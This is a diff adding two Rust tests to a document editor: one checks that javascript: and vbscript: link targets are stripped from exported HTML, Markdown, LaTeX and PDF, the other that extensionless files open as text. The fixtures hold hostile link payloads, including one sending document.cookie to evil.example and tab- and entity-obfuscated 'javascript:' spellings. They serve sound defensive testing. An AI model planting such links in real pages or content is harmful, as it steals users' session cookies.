@@ -2732,3 +2732,50 @@ fn deleting_the_last_cell_column_never_leaves_a_table_without_rows() {
     run(&mut s, "edit.undo", json!({}));
     assert!(s.doc.body.iter().any(|b| b.as_table().is_some_and(|t| !t.rows.is_empty())));
 }
+
+/// A document's `javascript:` link (from Markdown, RTF, DOCX or an HTML spelling browsers still
+/// run) must not become a live link in an exported page, Markdown, LaTeX or PDF. The text stays.
+#[test]
+fn hostile_link_targets_do_not_become_live_links_in_exports() {
+    let sources: [(&str, &str); 5] = [
+        ("a.md", "[Click for your invoice](javascript:fetch('https://evil.example/?c='+document.cookie))\n"),
+        ("a.rtf", r#"{\rtf1\ansi{\field{\*\fldinst{HYPERLINK "javascript:alert(1)"}}{\fldrslt{Click for your invoice}}}}"#),
+        ("a.html", "<p><a href=\"java\tscript:alert(1)\">Click for your invoice</a></p>"),
+        ("b.html", "<p><a href=\"java&#9;script:alert(1)\">Click for your invoice</a></p>"),
+        ("c.html", "<p><a href=\"vbscript:msgbox(1)\">Click for your invoice</a></p>"),
+    ];
+    for (name, src) in sources {
+        let doc = crate::io::open_bytes(name, src.as_bytes()).unwrap();
+        // Through a Word round trip too: DOCX keeps the link as it is (fidelity).
+        let doc = crate::io::open_bytes("x.docx", &crate::io::save_bytes("x.docx", &doc).unwrap()).unwrap();
+        for ext in ["html", "md", "tex"] {
+            let out = String::from_utf8(crate::io::save_bytes(&format!("out.{ext}"), &doc).unwrap()).unwrap();
+            let low = out.to_ascii_lowercase().replace(['\t', '\n', '\r'], "");
+            assert!(!low.contains("javascript:") && !low.contains("vbscript:"), "{name} → .{ext}: {out}");
+            assert!(out.contains("Click for your invoice"), "{name} → .{ext} keeps the text: {out}");
+        }
+        let pdf = crate::io::save_bytes("out.pdf", &doc).unwrap();
+        assert!(!pdf.windows(11).any(|w| w.eq_ignore_ascii_case(b"javascript:")), "{name} → .pdf");
+    }
+    // Ordinary links still export.
+    let doc = crate::io::open_bytes("ok.md", b"[site](https://example.com) and [top](#top)\n").unwrap();
+    let html = String::from_utf8(crate::io::save_bytes("ok.html", &doc).unwrap()).unwrap();
+    assert!(html.contains("<a href=\"https://example.com\">site</a>"), "{html}");
+    let pdf = crate::io::save_bytes("ok.pdf", &doc).unwrap();
+    assert!(pdf.windows(19).any(|w| w == b"https://example.com"), "the web link is a PDF link");
+}
+
+/// Files without an extension open as plain text, including in folders whose names have dots
+/// (`ext_of` used to take everything after the last dot of the whole path, so `README` was an
+/// "unsupported format `.../README`" and `/home/john.smith/notes` had the extension `smith/notes`).
+#[test]
+fn files_without_an_extension_open_as_text() {
+    for name in ["README", "/home/john.smith/notes", "C:\\Users\\john.smith\\Documents\\todo", ".bashrc", "/tmp/a.b/.profile"] {
+        let doc = crate::io::open_bytes(name, b"plain words").unwrap_or_else(|e| panic!("{name}: {e}"));
+        assert_eq!(doc.plain_text(StoryRef::Body).trim(), "plain words", "{name}");
+    }
+    // Real extensions are still read from the file name, in any case.
+    assert!(crate::io::open_bytes("/home/john.smith/Report.MD", b"# Title\n").is_ok());
+    assert!(crate::io::open_bytes("/home/john.smith/notes.xyz", b"x").is_err_and(|e| e.contains("`.xyz`")));
+    assert!(crate::io::save_bytes("/home/john.smith/report", &wordcraft_doc::Document::new()).is_err());
+}
